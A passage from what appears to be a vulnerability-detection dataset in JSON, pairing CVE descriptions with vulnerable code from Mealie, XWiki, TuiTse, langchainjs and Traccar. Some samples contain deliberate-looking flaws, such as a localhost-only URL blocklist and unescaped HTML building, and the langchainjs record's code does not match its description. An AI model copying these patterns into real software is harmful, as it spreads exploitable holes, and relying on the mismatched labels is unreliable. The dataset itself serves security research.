          "content": "import asyncio\nimport shutil\nfrom pathlib import Path\n\nfrom httpx import AsyncClient, Response\nfrom pydantic import UUID4\n\nfrom mealie.pkgs import img\nfrom mealie.schema.recipe.recipe import Recipe\nfrom mealie.services._base_service import BaseService\n\n_FIREFOX_UA = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0\"\n\n\nasync def gather_with_concurrency(n, *coros, ignore_exceptions=False):\n    semaphore = asyncio.Semaphore(n)\n\n    async def sem_coro(coro):\n        async with semaphore:\n            return await coro\n\n    results = await asyncio.gather(*(sem_coro(c) for c in coros), return_exceptions=ignore_exceptions)\n    if ignore_exceptions:\n        results = [r for r in results if not isinstance(r, Exception)]\n    return results\n\n\nasync def largest_content_len(urls: list[str]) -> tuple[str, int]:\n    largest_url = \"\"\n    largest_len = 0\n\n    async def do(client: AsyncClient, url: str) -> Response:\n        return await client.head(url, headers={\"User-Agent\": _FIREFOX_UA})\n\n    async with AsyncClient() as client:\n        tasks = [do(client, url) for url in urls]\n        responses: list[Response] = await gather_with_concurrency(10, *tasks, ignore_exceptions=True)\n        for response in responses:\n            len_int = int(response.headers.get(\"Content-Length\", 0))\n            if len_int > largest_len:\n                largest_url = str(response.url)\n                largest_len = len_int\n\n    return largest_url, largest_len\n\n\nclass NotAnImageError(Exception):\n    pass\n\n\nclass InvalidDomainError(Exception):\n    pass\n\n\nclass RecipeDataService(BaseService):\n    minifier: img.ABCMinifier\n\n    def __init__(self, recipe_id: UUID4, group_id: UUID4 | None = None) -> None:\n        \"\"\"\n        RecipeDataService is a service that consolidates the reading/writing actions related\n        to assets, and images for a recipe.\n        \"\"\"\n        super().__init__()\n\n        self.recipe_id = recipe_id\n        self.slug = group_id\n        self.minifier = img.PillowMinifier(purge=True, logger=self.logger)\n\n        self.dir_data = Recipe.directory_from_id(self.recipe_id)\n        self.dir_image = self.dir_data.joinpath(\"images\")\n        self.dir_image_timeline = self.dir_image.joinpath(\"timeline\")\n        self.dir_assets = self.dir_data.joinpath(\"assets\")\n\n        for dir in [self.dir_image, self.dir_image_timeline, self.dir_assets]:\n            dir.mkdir(parents=True, exist_ok=True)\n\n    def delete_all_data(self) -> None:\n        try:\n            shutil.rmtree(self.dir_data)\n        except Exception as e:\n            self.logger.exception(f\"Failed to delete recipe data: {e}\")\n\n    def write_image(self, file_data: bytes | Path, extension: str, image_dir: Path | None = None) -> Path:\n        if not image_dir:\n            image_dir = self.dir_image\n\n        extension = extension.replace(\".\", \"\")\n        image_path = image_dir.joinpath(f\"original.{extension}\")\n        image_path.unlink(missing_ok=True)\n\n        if isinstance(file_data, Path):\n            shutil.copy2(file_data, image_path)\n        elif isinstance(file_data, bytes):\n            with open(image_path, \"ab\") as f:\n                f.write(file_data)\n        else:\n            with open(image_path, \"ab\") as f:\n                shutil.copyfileobj(file_data, f)\n\n        self.minifier.minify(image_path)\n\n        return image_path\n\n    @staticmethod\n    def _validate_image_url(url: str) -> bool:\n        # sourcery skip: invert-any-all, use-any\n        \"\"\"\n        Validates that the URL is of an allowed source and restricts certain sources to prevent\n        malicious images from being downloaded.\n        \"\"\"\n        invalid_domains = {\"127.0.0.1\", \"localhost\"}\n        for domain in invalid_domains:\n            if domain in url:\n                return False\n\n        return True\n\n    async def scrape_image(self, image_url) -> None:\n        self.logger.info(f\"Image URL: {image_url}\")\n\n        if not self._validate_image_url(image_url):\n            self.logger.error(f\"Invalid image URL: {image_url}\")\n            raise InvalidDomainError(f\"Invalid domain: {image_url}\")\n\n        if isinstance(image_url, str):  # Handles String Types\n            pass\n\n        elif isinstance(image_url, list):  # Handles List Types\n            # Multiple images have been defined in the schema - usually different resolutions\n            # Typically would be in smallest->biggest order, but can't be certain so test each.\n            # 'Google will pick the best image to display in Search results based on the aspect ratio and resolution.'\n            image_url, _ = await largest_content_len(image_url)\n\n        elif isinstance(image_url, dict):  # Handles Dictionary Types\n            for key in image_url:\n                if key == \"url\":\n                    image_url = image_url.get(\"url\")\n\n        ext = image_url.split(\".\")[-1]\n\n        if ext not in img.IMAGE_EXTENSIONS:\n            ext = \"jpg\"  # Guess the extension\n\n        file_name = f\"{str(self.recipe_id)}.{ext}\"\n        file_path = Recipe.directory_from_id(self.recipe_id).joinpath(\"images\", file_name)\n\n        async with AsyncClient() as client:\n            try:\n                r = await client.get(image_url, headers={\"User-Agent\": _FIREFOX_UA})\n            except Exception:\n                self.logger.exception(\"Fatal Image Request Exception\")\n                return None\n\n            if r.status_code != 200:\n                # TODO: Probably should throw an exception in this case as well, but before these changes\n                # we were returning None if it failed anyways.\n                return None\n\n            content_type = r.headers.get(\"content-type\", \"\")\n\n            if \"image\" not in content_type:\n                self.logger.error(f\"Content-Type: {content_type} is not an image\")\n                raise NotAnImageError(f\"Content-Type {content_type} is not an image\")\n\n            self.logger.debug(f\"File Name Suffix {file_path.suffix}\")\n            self.write_image(r.read(), file_path.suffix)\n            file_path.unlink(missing_ok=True)\n"
        }
      ],
      "method_level": [
        "def _validate_image_url(url: str) -> bool:\n        # sourcery skip: invert-any-all, use-any\n        \"\"\"\n        Validates that the URL is of an allowed source and restricts certain sources to prevent\n        malicious images from being downloaded.\n        \"\"\"\n        invalid_domains = {\"127.0.0.1\", \"localhost\"}\n        for domain in invalid_domains:\n            if domain in url:\n                return False\n\n        return True"
      ],
      "hunk_level": [
        {
          "line_no": 105,
          "content": "    def _validate_image_url(url: str) -> bool:"
        },
        {
          "line_no": 106,
          "content": "        # sourcery skip: invert-any-all, use-any"
        },
        {
          "line_no": 107,
          "content": "        \"\"\""
        },
        {
          "line_no": 108,
          "content": "        Validates that the URL is of an allowed source and restricts certain sources to prevent"
        },
        {
          "line_no": 109,
          "content": "        malicious images from being downloaded."
        },
        {
          "line_no": 110,
          "content": "        \"\"\""
        },
        {
          "line_no": 111,
          "content": "        invalid_domains = {\"127.0.0.1\", \"localhost\"}"
        },
        {
          "line_no": 112,
          "content": "        for domain in invalid_domains:"
        },
        {
          "line_no": 113,
          "content": "            if domain in url:"
        },
        {
          "line_no": 114,
          "content": "                return False"
        },
        {
          "line_no": 116,
          "content": "        return True"
        }
      ]
    },
    "cwe": [
      "CWE-770",
      "CWE-400"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 616,
    "cve": "CVE-2024-31985",
    "description": "XWiki Platform is a generic wiki platform. Starting in version 3.1 and prior to versions 4.10.20, 15.5.4, and 15.10-rc-1, it is possible to schedule/trigger/unschedule existing jobs by having an admin visit the Job Scheduler page through a predictable URL, for example by embedding such an URL in any content as an image. The vulnerability has been fixed in XWiki 14.10.19, 15.5.5, and 15.9. As a workaround, manually apply the patch by modifying the `Scheduler.WebHome` page.",
    "vulnerability": {
      "file_level": [
        {
          "name": "xwiki-platform-core/xwiki-platform-scheduler/xwiki-platform-scheduler-test/xwiki-platform-scheduler-test-docker/src/test/it/org/xwiki/scheduler/test/ui/SchedulerIT.java",
          "content": "/*\n * See the NOTICE file distributed with this work for additional\n * information regarding copyright ownership.\n *\n * This is free software; you can redistribute it and/or modify it\n * under the terms of the GNU Lesser General Public License as\n * published by the Free Software Foundation; either version 2.1 of\n * the License, or (at your option) any later version.\n *\n * This software is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public\n * License along with this software; if not, write to the Free\n * Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n * 02110-1301 USA, or see the FSF site: http://www.fsf.org.\n */\npackage org.xwiki.scheduler.test.ui;\n\nimport org.junit.jupiter.api.Order;\nimport org.junit.jupiter.api.Test;\nimport org.openqa.selenium.By;\nimport org.xwiki.scheduler.test.po.SchedulerHomePage;\nimport org.xwiki.scheduler.test.po.SchedulerPage;\nimport org.xwiki.scheduler.test.po.editor.SchedulerEditPage;\nimport org.xwiki.test.docker.junit5.UITest;\nimport org.xwiki.test.ui.TestUtils;\n\nimport static org.junit.jupiter.api.Assertions.assertEquals;\nimport static org.junit.jupiter.api.Assertions.assertFalse;\nimport static org.junit.jupiter.api.Assertions.fail;\n\n/**\n * Tests Scheduler application features.\n *\n * @version $Id$\n */\n@UITest(\n    properties = {\n        // The scheduler UI need programming right\n        \"xwikiPropertiesAdditionalProperties=test.prchecker.excludePattern=xwiki:Scheduler\\\\.WebHome\",\n\n        // Override in order to add the Scheduler Plugin\n        \"xwikiCfgPlugins=com.xpn.xwiki.plugin.skinx.JsSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.JsSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.LinkExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.scheduler.SchedulerPlugin\"\n    },\n    extraJARs = {\n        // The Scheduler plugin needs to be in WEB-INF/lib since it's defined in xwiki.cfg and plugins are loaded\n        // by XWiki at startup, i.e. before extensions are provisioned for the tests\n        \"org.xwiki.platform:xwiki-platform-scheduler-api\",\n        // Because of https://jira.xwiki.org/browse/XWIKI-17972 we need to install the jython jar manually in\n        // WEB-INF/lib.\n        \"org.python:jython-slim:2.7.3\"\n})\nclass SchedulerIT\n{\n    @Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }\n\n    @Test\n    @Order(2)\n    void verifyEscaping(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        schedulerEdit.setScript(\"{{/code}}\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n\n        assertEquals(\"{{/code}}\", schedulerPage.getScript());\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 73,
          "content": "        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");"
        },
        {
          "line_no": 77,
          "content": "        schedulerHomePage.setJobName(\"SchedulerTestJob\");"
        },
        {
          "line_no": 110,
          "content": "        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");"
        }
      ]
    },
    "cwe": [
      "CWE-352"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.4,
    "cvss_version": 3.1
  },
  {
    "id": 146,
    "cve": "CVE-2024-23341",
    "description": "TuiTse-TsuSin is a package for organizing the comparative corpus of Taiwanese Chinese characters and Roman characters, and extracting sentences of the Taiwanese Chinese characters and the Roman characters. Prior to version 1.3.2, when using `tuitse_html` without quoting the input, there is a html injection vulnerability. Version 1.3.2 contains a patch for the issue. As a workaround, sanitize Taigi input with HTML quotation.",
    "vulnerability": {
      "file_level": [
        {
          "name": "tuitse/html.py",
          "content": "from django.utils.html import format_html\nfrom tuitse import THAU_JI, LIAN_JI, KHIN_SIANN_JI\nfrom kesi.butkian.kongiong import 敢是拼音字元\n\n\ndef tuitse_html(kiamtsa_tinliat):\n    html = ''\n    htmlsu = ''\n    kam_ting_tsit_hing_si_lomaji = False\n    kam_ting_tsit_im_si_lomaji = False\n    for ji in kiamtsa_tinliat:\n        # Kuat-tīng Tsit jī ê hîng ài liân-jī-hû--bô\n        kam_hing_si_lomaji = 敢是拼音字元(ji[0][-1:])\n\n        if kam_hing_si_lomaji and kam_ting_tsit_hing_si_lomaji:\n            kam_hing_ai_lian = True\n        else:\n            kam_hing_ai_lian = False\n\n        kam_ting_tsit_hing_si_lomaji = kam_hing_si_lomaji\n\n        # Kuat-tīng Tsit jī ê im ài liân-jī-hû--bô\n        kam_im_si_lomaji = 敢是拼音字元(ji[1][-1:])\n\n        if kam_im_si_lomaji and kam_ting_tsit_im_si_lomaji:\n            kam_im_ai_lian = True\n        else:\n            kam_im_ai_lian = False\n\n        kam_ting_tsit_im_si_lomaji = kam_im_si_lomaji\n\n        if ji[2] == THAU_JI:\n            # Thòo sû ê html\n            if htmlsu:\n                html += \"<ruby>{}</ruby>\".format(htmlsu)\n            # Html tîng-lâi\n            htmlsu = _sng_ji_html(ji)\n            continue\n\n        if ji[2] == LIAN_JI:\n            tiauhu = '-'\n        elif ji[2] == KHIN_SIANN_JI:\n            tiauhu = '--'\n        else:\n            raise RuntimeError('一定愛設定頭字、連字、a̍h-sī輕聲')\n\n        if kam_im_ai_lian:\n            htmlsu += \"<rb>{}</rb>\".format(tiauhu)\n        else:\n            htmlsu += \"<rb>&nbsp;</rb>\"\n\n        if kam_hing_ai_lian:\n            htmlsu += \"<rt>{}</rt>\".format(tiauhu)\n        else:\n            htmlsu += \"<rt></rt>\"\n\n        htmlsu += _sng_ji_html(ji)\n    # Thòo bué sû ê html\n    html += \"<ruby>{}</ruby>\".format(htmlsu)\n    return format_html(html)\n\n\ndef _sng_ji_html(ji):\n    if ji[3]:\n        return \"<rb>{}</rb><rt>{}</rt>\".format(ji[1], ji[0])\n    if ji[1]:\n        return \"<rb class='fail'>{}</rb><rt class='fail'>{}</rt>\".format(\n            ji[1], ji[0])\n    return \"<rb class='fail'>&nbsp;&nbsp;</rb><rt class='fail'>{}</rt>\".format(\n        ji[0])\n"
        }
      ],
      "method_level": [
        "def tuitse_html(kiamtsa_tinliat):\n    html = ''\n    htmlsu = ''\n    kam_ting_tsit_hing_si_lomaji = False\n    kam_ting_tsit_im_si_lomaji = False\n    for ji in kiamtsa_tinliat:\n        # Kuat-tīng Tsit jī ê hîng ài liân-jī-hû--bô\n        kam_hing_si_lomaji = 敢是拼音字元(ji[0][-1:])\n\n        if kam_hing_si_lomaji and kam_ting_tsit_hing_si_lomaji:\n            kam_hing_ai_lian = True\n        else:\n            kam_hing_ai_lian = False\n\n        kam_ting_tsit_hing_si_lomaji = kam_hing_si_lomaji\n\n        # Kuat-tīng Tsit jī ê im ài liân-jī-hû--bô\n        kam_im_si_lomaji = 敢是拼音字元(ji[1][-1:])\n\n        if kam_im_si_lomaji and kam_ting_tsit_im_si_lomaji:\n            kam_im_ai_lian = True\n        else:\n            kam_im_ai_lian = False\n\n        kam_ting_tsit_im_si_lomaji = kam_im_si_lomaji\n\n        if ji[2] == THAU_JI:\n            # Thòo sû ê html\n            if htmlsu:\n                html += \"<ruby>{}</ruby>\".format(htmlsu)\n            # Html tîng-lâi\n            htmlsu = _sng_ji_html(ji)\n            continue\n\n        if ji[2] == LIAN_JI:\n            tiauhu = '-'\n        elif ji[2] == KHIN_SIANN_JI:\n            tiauhu = '--'\n        else:\n            raise RuntimeError('一定愛設定頭字、連字、a̍h-sī輕聲')\n\n        if kam_im_ai_lian:\n            htmlsu += \"<rb>{}</rb>\".format(tiauhu)\n        else:\n            htmlsu += \"<rb>&nbsp;</rb>\"\n\n        if kam_hing_ai_lian:\n            htmlsu += \"<rt>{}</rt>\".format(tiauhu)\n        else:\n            htmlsu += \"<rt></rt>\"\n\n        htmlsu += _sng_ji_html(ji)\n    # Thòo bué sû ê html\n    html += \"<ruby>{}</ruby>\".format(htmlsu)\n    return format_html(html)",
        "def _sng_ji_html(ji):\n    if ji[3]:\n        return \"<rb>{}</rb><rt>{}</rt>\".format(ji[1], ji[0])\n    if ji[1]:\n        return \"<rb class='fail'>{}</rb><rt class='fail'>{}</rt>\".format(\n            ji[1], ji[0])\n    return \"<rb class='fail'>&nbsp;&nbsp;</rb><rt class='fail'>{}</rt>\".format(\n        ji[0])"
      ],
      "hunk_level": [
        {
          "line_no": 8,
          "content": "    htmlsu = ''"
        },
        {
          "line_no": 34,
          "content": "            if htmlsu:"
        },
        {
          "line_no": 35,
          "content": "                html += \"<ruby>{}</ruby>\".format(htmlsu)"
        },
        {
          "line_no": 37,
          "content": "            htmlsu = _sng_ji_html(ji)"
        },
        {
          "line_no": 48,
          "content": "            htmlsu += \"<rb>{}</rb>\".format(tiauhu)"
        },
        {
          "line_no": 50,
          "content": "            htmlsu += \"<rb>&nbsp;</rb>\""
        },
        {
          "line_no": 53,
          "content": "            htmlsu += \"<rt>{}</rt>\".format(tiauhu)"
        },
        {
          "line_no": 55,
          "content": "            htmlsu += \"<rt></rt>\""
        },
        {
          "line_no": 57,
          "content": "        htmlsu += _sng_ji_html(ji)"
        },
        {
          "line_no": 59,
          "content": "    html += \"<ruby>{}</ruby>\".format(htmlsu)"
        },
        {
          "line_no": 60,
          "content": "    return format_html(html)"
        },
        {
          "line_no": 65,
          "content": "        return \"<rb>{}</rb><rt>{}</rt>\".format(ji[1], ji[0])"
        },
        {
          "line_no": 67,
          "content": "        return \"<rb class='fail'>{}</rb><rt class='fail'>{}</rt>\".format("
        },
        {
          "line_no": 68,
          "content": "            ji[1], ji[0])"
        },
        {
          "line_no": 69,
          "content": "    return \"<rb class='fail'>&nbsp;&nbsp;</rb><rt class='fail'>{}</rt>\".format("
        },
        {
          "line_no": 70,
          "content": "        ji[0])"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.1,
    "cvss_version": 3.1
  },
  {
    "id": 1271,
    "cve": "CVE-2024-7042",
    "description": "A vulnerability in the GraphCypherQAChain class of langchain-ai/langchainjs versions 0.2.5 and all versions with this class allows for prompt injection, leading to SQL injection. This vulnerability permits unauthorized data manipulation, data exfiltration, denial of service (DoS) by deleting all data, breaches in multi-tenant security environments, and data integrity issues. Attackers can create, update, or delete nodes and relationships without proper authorization, extract sensitive data, disrupt services, access data across different tenants, and compromise the integrity of the database.",
    "vulnerability": {
      "file_level": [
        {
          "name": "examples/src/indexes/vector_stores/lancedb/fromDocs.ts",
          "content": "import { LanceDB } from \"@langchain/community/vectorstores/lancedb\";\nimport { OpenAIEmbeddings } from \"@langchain/openai\";\nimport { TextLoader } from \"langchain/document_loaders/fs/text\";\nimport fs from \"node:fs/promises\";\nimport path from \"node:path\";\nimport os from \"node:os\";\nimport { connect } from \"vectordb\";\n\n// Create docs with a loader\nconst loader = new TextLoader(\"src/document_loaders/example_data/example.txt\");\nconst docs = await loader.load();\n\nexport const run = async () => {\n  const dir = await fs.mkdtemp(path.join(os.tmpdir(), \"lancedb-\"));\n  const db = await connect(dir);\n  const table = await db.createTable(\"vectors\", [\n    { vector: Array(1536), text: \"sample\", source: \"a\" },\n  ]);\n\n  const vectorStore = await LanceDB.fromDocuments(\n    docs,\n    new OpenAIEmbeddings(),\n    { table }\n  );\n\n  const resultOne = await vectorStore.similaritySearch(\"hello world\", 1);\n  console.log(resultOne);\n\n  // [\n  //   Document {\n  //     pageContent: 'Foo\\nBar\\nBaz\\n\\n',\n  //     metadata: { source: 'src/document_loaders/example_data/example.txt' }\n  //   }\n  // ]\n};\n"
        },
        {
          "name": "examples/src/indexes/vector_stores/lancedb/fromTexts.ts",
          "content": "import { LanceDB } from \"@langchain/community/vectorstores/lancedb\";\nimport { OpenAIEmbeddings } from \"@langchain/openai\";\nimport { connect } from \"vectordb\";\nimport * as fs from \"node:fs/promises\";\nimport * as path from \"node:path\";\nimport os from \"node:os\";\n\nexport const run = async () => {\n  const dir = await fs.mkdtemp(path.join(os.tmpdir(), \"lancedb-\"));\n  const db = await connect(dir);\n  const table = await db.createTable(\"vectors\", [\n    { vector: Array(1536), text: \"sample\", id: 1 },\n  ]);\n\n  const vectorStore = await LanceDB.fromTexts(\n    [\"Hello world\", \"Bye bye\", \"hello nice world\"],\n    [{ id: 2 }, { id: 1 }, { id: 3 }],\n    new OpenAIEmbeddings(),\n    { table }\n  );\n\n  const resultOne = await vectorStore.similaritySearch(\"hello world\", 1);\n  console.log(resultOne);\n  // [ Document { pageContent: 'hello nice world', metadata: { id: 3 } } ]\n};\n"
        }
      ],
      "method_level": [
        "run",
        "run"
      ],
      "hunk_level": [
        {
          "line_no": 15,
          "content": "  const db = await connect(dir);"
        },
        {
          "line_no": 16,
          "content": "  const table = await db.createTable(\"vectors\", ["
        },
        {
          "line_no": 17,
          "content": "    { vector: Array(1536), text: \"sample\", source: \"a\" },"
        },
        {
          "line_no": 18,
          "content": "  ]);"
        },
        {
          "line_no": 20,
          "content": "  const vectorStore = await LanceDB.fromDocuments("
        },
        {
          "line_no": 21,
          "content": "    docs,"
        },
        {
          "line_no": 22,
          "content": "    new OpenAIEmbeddings(),"
        },
        {
          "line_no": 23,
          "content": "    { table }"
        },
        {
          "line_no": 24,
          "content": "  );"
        },
        {
          "line_no": 9,
          "content": "  const dir = await fs.mkdtemp(path.join(os.tmpdir(), \"lancedb-\"));"
        },
        {
          "line_no": 10,
          "content": "  const db = await connect(dir);"
        },
        {
          "line_no": 11,
          "content": "  const table = await db.createTable(\"vectors\", ["
        },
        {
          "line_no": 12,
          "content": "    { vector: Array(1536), text: \"sample\", id: 1 },"
        },
        {
          "line_no": 13,
          "content": "  ]);"
        },
        {
          "line_no": 18,
          "content": "    new OpenAIEmbeddings(),"
        },
        {
          "line_no": 19,
          "content": "    { table }"
        }
      ]
    },
    "cwe": [
      "CWE-89"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.8,
    "cvss_version": 3.1
  },
  {
    "id": 589,
    "cve": "CVE-2024-31214",
    "description": "Traccar is an open source GPS tracking system. Traccar versions 5.1 through 5.12 allow arbitrary files to be uploaded through the device image upload API. Attackers have full control over the file contents, full control over the directory where the file is stored, full control over the file extension, and partial control over the file name. While it's not  for an attacker to overwrite an existing file, an attacker can create new files with certain names and attacker-controlled extensions anywhere on the file system. This can potentially lead to remote code execution, XSS, DOS, etc. The default install of Traccar makes this vulnerability more severe. Self-registration is enabled by default, allowing anyone to create an account to exploit this vulnerability. Traccar also runs by default with root/system privileges, allowing files to be placed anywhere on the file system. Version 6.0 contains a fix for the issue. One may also turn off self-registration by default, as that would make most vulnerabilities in the application much harder to exploit by default and reduce the severity considerably.\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/main/java/org/traccar/model/Device.java",
          "content": "/*\n * Copyright 2012 - 2023 Anton Tananaev (anton@traccar.org)\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage org.traccar.model;\n\nimport com.fasterxml.jackson.annotation.JsonIgnore;\nimport org.traccar.storage.QueryIgnore;\nimport org.traccar.storage.StorageName;\n\nimport java.util.Date;\n\n@StorageName(\"tc_devices\")\npublic class Device extends GroupedModel implements Disableable, Schedulable {\n\n    private long calendarId;\n\n    @Override\n    public long getCalendarId() {\n        return calendarId;\n    }\n\n    @Override\n    public void setCalendarId(long calendarId) {\n        this.calendarId = calendarId;\n    }\n\n    private String name;\n\n    public String getName() {\n        return name;\n    